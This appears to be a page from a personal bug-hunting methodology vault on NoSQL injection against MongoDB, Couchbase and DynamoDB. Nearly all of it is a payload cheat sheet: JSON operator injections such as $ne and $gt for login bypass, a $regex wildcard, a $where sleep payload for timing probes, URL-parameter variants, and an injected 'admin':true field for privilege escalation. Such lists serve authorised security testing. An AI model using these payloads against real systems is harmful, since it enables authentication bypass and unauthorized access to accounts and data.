> [!abstract] Module: [[4-Methodology/Crow-Hustler/hunter-methodology-V1/hunting/00-index|← Back to Hunting]]

# NoSQL Injection

Targets: MongoDB, Couchbase, DynamoDB query syntax in JSON bodies.

## Payloads

```json
{"username":"admin","password":{"$ne":""}}
{"$where":"sleep(1000)"}
{"$regex":".*"}
{"username":{"$gt":""},"password":{"$gt":""}}
```

URL params: `username[$ne]=admin&password[$ne]=`
Value mutation: `{"username":"admin","admin":true}`
